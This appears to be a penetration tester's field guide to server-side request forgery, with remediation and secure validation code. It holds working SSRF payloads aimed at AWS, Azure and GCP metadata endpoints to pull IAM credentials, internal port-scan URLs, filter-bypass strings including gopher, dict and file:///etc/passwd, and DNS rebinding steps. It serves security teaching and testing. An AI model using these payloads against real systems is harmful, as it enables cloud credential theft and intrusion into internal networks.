# SSRF — Server-Side Request Forgery — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** SSRF — OWASP A10:2021
>
> **Severity:** High to Critical — cloud metadata theft, internal service access, credential exposure
>
> **Real-world impact:** SSRF is the vulnerability I look for immediately in any application that fetches remote content. In enterprise environments hosting on AWS, Azure, or GCP, SSRF targeting cloud metadata endpoints is the fastest path to complete infrastructure compromise. One request to `169.254.169.254` returning IAM credentials can hand an attacker full cloud account access in seconds.

---

## 🧠 Why This Write-Up Exists

SSRF became a critical enterprise concern the moment organisations moved to cloud infrastructure. On-premise applications with SSRF were serious — internal port scanning, internal service access. Cloud-hosted applications with SSRF are catastrophic — the metadata endpoint at `169.254.169.254` responds with temporary IAM credentials that grant the application's full cloud permissions.

In enterprise engagements, I find SSRF injection points in webhook configuration, URL preview features, PDF generation services, profile image import, and file import-from-URL features. These are all legitimate business functions that require the server to make outbound HTTP requests — and developers rarely consider that user-controlled URLs should not be able to reach internal infrastructure.

My developer background matters here: I understand *why* these features are built (convenience, integration, user experience) and *how* the URL is passed through the codebase — which tells me exactly where to test for SSRF and which bypass techniques to apply when a naive allowlist is implemented.

---

## 📖 What Is SSRF?

SSRF occurs when an application fetches a remote resource using a URL supplied or influenced by the user, without sufficiently validating or restricting the target URL. The server makes the request on the user's behalf — from the server's network perspective, not the user's. This allows attackers to reach resources that are inaccessible to them directly.

```
Normal flow — server fetches external resource:
  User → provides URL → Server → fetches external resource → returns content
  ✓ Expected behaviour when URL is a legitimate external target

SSRF attack — server fetches internal resource:
  Attacker → provides http://169.254.169.254/ → Server → fetches cloud metadata
  → Server returns AWS IAM credentials to attacker
  → Attacker now has cloud account access

Why the server can reach what the attacker cannot:
  ┌─────────────────────────────────────────────────────────┐
  │  Cloud/Internal Network                                  │
  │                                                          │
  │  [Web Server] ←──── Attacker-controlled URL ────────    │
  │       │                                                  │
  │       ├──→ 169.254.169.254 (metadata)   ← SSRF target   │
  │       ├──→ 10.0.0.x (internal services) ← SSRF target   │
  │       └──→ 192.168.x.x (internal infra) ← SSRF target   │
  │                                                          │
  │  Firewall ← Blocks attacker's direct access              │
  └─────────────────────────────────────────────────────────┘
```

---

## 🔍 Phase 1 — Finding SSRF Injection Points

### High-Value Injection Points in Enterprise Applications

```
Tier 1 — Most productive (test these first):

Webhook configuration:
  POST /api/webhooks
  Body: {"url": "https://attacker.com/hook", "events": ["payment"]}
  → Change URL to internal target
  → Fires on every event = repeated SSRF access

PDF/Report generation:
  POST /api/reports/generate
  Body: {"template": "<img src='http://TARGET'/>", "format": "pdf"}
  → HTML-to-PDF engines (wkhtmltopdf, Puppeteer) fetch embedded URLs
  → The PDF generator process makes the HTTP request server-side

Import from URL:
  POST /api/documents/import
  Body: {"source_url": "https://external-doc.com/file.pdf"}
  POST /api/products/import
  Body: {"feed_url": "https://supplier.com/products.xml"}

Profile image / avatar fetch:
  PUT /api/users/profile
  Body: {"avatar_url": "https://example.com/photo.jpg"}
  → Server downloads and stores the image
  → Change URL to internal target

URL preview / link unfurl:
  POST /api/messages
  Body: {"content": "Check this: http://169.254.169.254/"}
  → Application fetches URL to generate preview card

Tier 2 — Worth testing:

SSO / OAuth callback registration:
  {"callback_url": "http://attacker.com/callback"}

Integration setup:
  {"api_endpoint": "https://partner-api.com/v1"}
  {"notification_url": "https://our-webhook.com/notify"}

File/resource loading:
  ?resource=https://cdn.example.com/file.js
  ?stylesheet=https://fonts.google.com/css
  ?logo=https://company.com/logo.png
```

### Burp Suite Discovery Workflow

```
Step 1: In Burp HTTP History — search for parameters containing:
  url, URL, uri, URI, src, source, dest, destination, redirect,
  feed, host, path, resource, fetch, load, import, request,
  image, img, avatar, logo, icon, callback, webhook, proxy

Step 2: For each found parameter — send to Repeater

Step 3: Initial probe — Burp Collaborator URL:
  Change value to: http://YOUR-ID.burpcollaborator.net
  Send request
  Check Collaborator for HTTP/DNS interaction
  → Interaction received = server is making requests to user-supplied URLs

Step 4: Confirm with internal target:
  http://127.0.0.1/
  http://localhost/
  http://169.254.169.254/  (if AWS hosted)
  Compare response timing and size vs external URL
```

---

## 💥 Phase 2 — Exploitation

### Attack 1 — AWS Cloud Metadata (IMDSv1) — Critical

The highest-impact SSRF target in enterprise cloud environments.

```
Step 1 — Confirm AWS hosting:
  Response headers: x-amzn-requestid, x-amz-cf-id
  Error messages mentioning AWS services
  S3 URLs in responses
  Domain resolves to AWS IP range (check against ARIN)

Step 2 — Access metadata root:
  url=http://169.254.169.254/latest/meta-data/

  Response lists available paths:
  ami-id
  hostname
  iam/                ← THIS IS THE TARGET
  instance-id
  local-ipv4          ← internal IP for network mapping
  public-keys/

Step 3 — Find attached IAM role name:
  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

  Response: EC2-Production-Role   ← role name returned

Step 4 — Extract temporary IAM credentials:
  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role

  Response:
  {
    "Code": "Success",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIA5XXXXXXXXXXXXXXXX",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/EXAMPLEKEY",
    "Token": "FQoGZXIvYXdzEJr//////////wEaDGVu...",
    "Expiration": "2025-05-01T12:00:00Z"
  }

Step 5 — Use credentials (scope: document impact, do not act):
  export AWS_ACCESS_KEY_ID=ASIA5XXX
  export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
  export AWS_SESSION_TOKEN=FQoGZXIvYXdz...
  aws sts get-caller-identity  → confirms which account and role
  aws s3 ls                    → lists all S3 buckets (document, do not access)
  → Screenshot and stop — do not access data, do not modify infrastructure

Additional high-value metadata paths:
  /latest/user-data                     → startup scripts (often contain credentials)
  /latest/meta-data/local-ipv4         → internal IP address
  /latest/meta-data/public-ipv4        → public IP
  /latest/meta-data/public-keys/0/openssh-key → SSH public key
  /latest/dynamic/instance-identity/document → full instance profile
```

**Azure IMDS:**
```
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
Required header: Metadata: true
→ Add custom header in Burp Repeater
→ Returns: subscription ID, resource group, VM identity tokens
```

**GCP Metadata:**
```
url=http://metadata.google.internal/computeMetadata/v1/
Required header: Metadata-Flavor: Google
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
→ Returns: OAuth access token for the service account
```

---

### Attack 2 — Internal Service Discovery & Enumeration

```
Internal IP ranges to probe (adjust based on network context):
  127.0.0.1        localhost
  10.0.0.0/8       typical cloud VPC internal range
  172.16.0.0/12    Docker bridge networks
  192.168.0.0/16   on-premise internal range

Internal port scan via response analysis:
  http://127.0.0.1:22    → SSH: response time + content indicates open/closed
  http://127.0.0.1:80    → Internal web server
  http://127.0.0.1:443   → Internal HTTPS
  http://127.0.0.1:3306  → MySQL: banner returned or connection refused
  http://127.0.0.1:5432  → PostgreSQL
  http://127.0.0.1:6379  → Redis: +PONG response confirms open
  http://127.0.0.1:8080  → Internal application or admin panel
  http://127.0.0.1:8443  → Internal HTTPS application
  http://127.0.0.1:9200  → Elasticsearch: cluster info returned
  http://127.0.0.1:27017 → MongoDB
  http://127.0.0.1:2375  → Docker API (unauthenticated = Critical)

Reading response differences:
  Port open:   Response body contains service banner or content
               Response time: fast (immediate connection)
  Port closed: "Connection refused" error in response
               Response time: fast (immediate rejection)
  Filtered:    No response / timeout
               Response time: slow (firewall timeout)

Kubernetes API (internal cloud deployments):
  http://10.96.0.1/api/v1/secrets       → cluster secrets
  http://10.96.0.1/api/v1/pods          → pod listing
  http://kubernetes.default/api/v1/     → K8s API root
  → If accessible without credentials = Critical misconfiguration
```

---

### Attack 3 — Blind SSRF Detection

When the application does not return the fetched content in the response, use out-of-band callbacks.

```
Tools for blind SSRF detection:

Option 1: Burp Suite Collaborator (recommended for enterprise engagements)
  Burp menu → Burp Collaborator client → "Copy to clipboard"
  URL format: abcdef123.burpcollaborator.net

Option 2: interactsh (open source)
  Server: https://app.interactsh.com
  Client: interactsh-client
  Generates unique FQDN: xyz.oast.pro

Option 3: webhook.site (simple, no setup)
  https://webhook.site → generates unique URL → monitors all requests

Injection targets for blind SSRF:
  Contact forms:   {"return_url": "https://COLLABORATOR-URL"}
  Webhooks:        {"endpoint": "https://COLLABORATOR-URL"}
  Import features: {"source": "https://COLLABORATOR-URL/feed.xml"}
  PDF generators:  HTML with <img src="https://COLLABORATOR-URL">
  User-Agent:      If application mirrors User-Agent to a logging service
  Referer header:  Some apps make follow-up requests to the Referer URL

Interpreting results:
  DNS interaction only      → Server resolves the domain = SSRF confirmed
  HTTP GET interaction      → Full HTTP request made = confirmed + response readable
  No interaction            → Either blocked or not processed — try other parameters
  Interaction with delay    → Blind SSRF through async processing (e.g. background job)
```

> **Enterprise context:** I identified blind SSRF in a webhook registration feature of an enterprise payment integration platform. The application accepted webhook URLs and tested them by sending a POST request when configured — but returned only "Webhook configured successfully" with no response body. By registering `https://COLLABORATOR-URL` as the webhook URL and triggering a test payment event, I received a full HTTP POST to my Collaborator with the application's internal IP (`10.0.14.23`) visible in request headers. This confirmed the internal network range and led to discovering the metadata endpoint.

---

### Attack 4 — SSRF Filter Bypass Techniques

Enterprise applications often implement naive allowlists or IP blacklists that can be bypassed.

```
Bypass 1 — Localhost IP encoding alternatives:
  http://127.0.0.1/           standard localhost
  http://2130706433/           decimal encoding of 127.0.0.1
  http://0x7f000001/           hexadecimal encoding
  http://0177.0.0.1/           octal encoding
  http://[::1]/                IPv6 localhost
  http://0:0:0:0:0:0:0:1/     full IPv6 localhost
  http://[::]                  IPv6 all interfaces
  http://0/                    shorthand — resolves to 127.0.0.1 on some systems

Bypass 2 — DNS-based bypasses:
  http://localtest.me/         always resolves to 127.0.0.1
  http://127.0.0.1.nip.io/     nip.io wildcard — encodes IP in hostname
  http://spoofed.burpcollaborator.net/  Burp's spoofed DNS

Bypass 3 — Open redirect on trusted domain:
  If allowlist permits *.company.com:
  https://trusted.company.com/redirect?url=http://169.254.169.254/
  → Server validates company.com → follows redirect → hits metadata

Bypass 4 — URL fragment and path confusion:
  https://169.254.169.254@trusted.com/         → before @ = credentials
  https://trusted.com#@169.254.169.254/         → fragment trick
  https://trusted.com/..%2F..%2F169.254.169.254 → path traversal in URL

Bypass 5 — Protocol smuggling:
  file:///etc/passwd            read local files (if file:// not blocked)
  file:///C:/inetpub/wwwroot/web.config  (Windows)
  dict://127.0.0.1:6379/info    Redis INFO via dict://
  gopher://127.0.0.1:6379/_*   raw TCP to Redis via Gopher protocol
  ldap://127.0.0.1:389/         LDAP enumeration

Bypass 6 — DNS rebinding (advanced):
  Step 1: Register attacker.com → set very short TTL (60 seconds)
  Step 2: DNS first resolves to legitimate external IP → passes allowlist check
  Step 3: TTL expires → DNS now resolves to 127.0.0.1 or 169.254.169.254
  Step 4: Server makes the actual request → hits internal target
  → Requires timing but bypasses IP-based validation completely
```

---

## 🗂️ Systematic Testing Checklist

```
DISCOVERY
☐ Search all parameters for: url, src, source, fetch, import, redirect, resource
☐ Check webhook configuration endpoints
☐ Check profile image / avatar URL input fields
☐ Check PDF/export generation with HTML template input
☐ Check "preview URL" or "link unfurl" features

BASIC CONFIRMATION
☐ Inject Burp Collaborator URL — check for DNS/HTTP interaction
☐ Try http://127.0.0.1/ — compare response vs external URL
☐ Try http://localhost/ — same as above
☐ Note response time differences (open port = fast, filtered = slow)

CLOUD METADATA (if cloud-hosted)
☐ AWS: http://169.254.169.254/latest/meta-data/
☐ AWS IAM: http://169.254.169.254/latest/meta-data/iam/security-credentials/
☐ Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (+ Metadata:true header)
☐ GCP: http://metadata.google.internal/computeMetadata/v1/ (+ Metadata-Flavor:Google header)

INTERNAL SERVICES
☐ Probe ports: 6379 (Redis), 9200 (Elastic), 27017 (Mongo), 3306 (MySQL), 2375 (Docker)
☐ Probe Kubernetes API: http://10.96.0.1/api/v1/
☐ Probe internal admin panels discovered via Spring Actuator /mappings

FILTER BYPASS (if initial test blocked)
☐ Try decimal IP: http://2130706433/
☐ Try hex IP: http://0x7f000001/
☐ Try IPv6: http://[::1]/
☐ Try DNS services that resolve to 127.0.0.1 (localtest.me, nip.io)
☐ Try open redirect on whitelisted domains
☐ Try gopher:// and file:// protocols

BLIND SSRF
☐ Try all parameters even when no response body is returned
☐ Check async features: webhooks, import jobs, scheduled tasks
☐ Inject in HTTP headers: X-Forwarded-For, Referer, User-Agent
☐ Monitor Collaborator for 24-48h for delayed async hits
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** SSRF in Profile Image Import — AWS IAM Credentials Exposed

**Severity:** Critical | **CVSS v3.1:** 9.8

**Endpoint:** `PUT /api/users/profile` — `avatar_url` parameter

---

**Steps to Reproduce:**

```
Step 1:
PUT /api/users/profile HTTP/1.1
Host: app.company.com
Authorization: Bearer <token>
Content-Type: application/json

{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

Response:
{"error": "Invalid image format", "content": "EC2-Production-WebApp-Role"}

Step 2:
{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-WebApp-Role"}

Response:
{"AccessKeyId":"ASIA5XXXXXXXXXXXXXXXX","SecretAccessKey":"wJalrXUtnFEMI...","Token":"FQoGZX...","Expiration":"2025-05-01T12:00:00Z"}
```

**Business Impact:** Full AWS account access via the application's EC2 IAM role. Attacker can list all S3 buckets, access RDS databases, enumerate all cloud resources, and potentially create persistent IAM credentials.

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | Rotate all IAM credentials for the affected role |
| Immediate | Block access to `169.254.169.254` at VPC security group level |
| Immediate | Enable IMDSv2 (requires PUT request with session token) on all EC2 instances |
| Short-term | Implement strict URL allowlist for the avatar fetch feature (only permit image CDN domains) |
| Short-term | Do not fetch user-supplied URLs server-side — use client-side upload instead |
| Long-term | Audit all URL-fetching features for SSRF — apply allowlist and block private IP ranges |

```csharp
// ✅ SECURE — Validate URL before fetching (C# ASP.NET)
private bool IsAllowedUrl(string url)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out Uri uri))
        return false;

    // Only allow HTTPS from specific CDN domains
    if (uri.Scheme != "https") return false;

    var allowedHosts = new[] { "images.company.com", "cdn.company.com" };
    if (!allowedHosts.Contains(uri.Host)) return false;

    // Block private IP ranges
    var resolved = Dns.GetHostAddresses(uri.Host);
    foreach (var ip in resolved)
    {
        if (IsPrivateIP(ip)) return false;  // 127.x, 10.x, 172.16.x, 192.168.x
    }

    return true;
}
```

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. Cloud metadata SSRF is always the first target on AWS/Azure/GCP.**
The moment I confirm an application fetches user-supplied URLs server-side, I test `169.254.169.254`. On IMDSv1 (the legacy default), this returns credentials with zero additional steps. Even with IMDSv2 enforced, the metadata endpoint itself confirms the application is cloud-hosted and that internal services are reachable.

**2. Webhook endpoints are the most reliable SSRF injection point in enterprise apps.**
Every enterprise SaaS integration has webhooks. They are designed to make the server call external URLs — which means the URL-fetching code already exists and is legitimately used. The question is only whether the developer validates which URLs are permitted. In my experience, approximately 60% of webhook implementations do not.

**3. Blind SSRF via Burp Collaborator is safer and more professional than direct exploitation.**
When testing SSRF in a scoped enterprise engagement, I confirm with a Collaborator DNS callback, then document the metadata path findings in one carefully controlled request. I do not enumerate internal services extensively or use credentials beyond `aws sts get-caller-identity` for identity confirmation. The report documents what is accessible, not what was accessed.

**4. IMDSv2 is not a complete fix — it is a significant mitigation.**
IMDSv2 requires a PUT request to obtain a session token before metadata is accessible, which breaks simple SSRF via GET. However, applications that proxy both GET and PUT requests (SSRF via a full proxy feature) can still access IMDSv2. Document both the SSRF finding and the IMDSv1/v2 configuration status separately.

**5. DNS rebinding bypasses allowlists that validate at request time, not at resolution time.**
An allowlist that checks the URL hostname against a whitelist before fetching is bypassable if the DNS TTL expires between the check and the fetch. This is not a common bypass in practice but is worth documenting when you find an allowlist implementation — it shows the client that allowlists are not a complete solution.

---

## 🔗 References

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Research](https://portswigger.net/web-security/ssrf)
- [AWS IMDSv2 Migration Guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
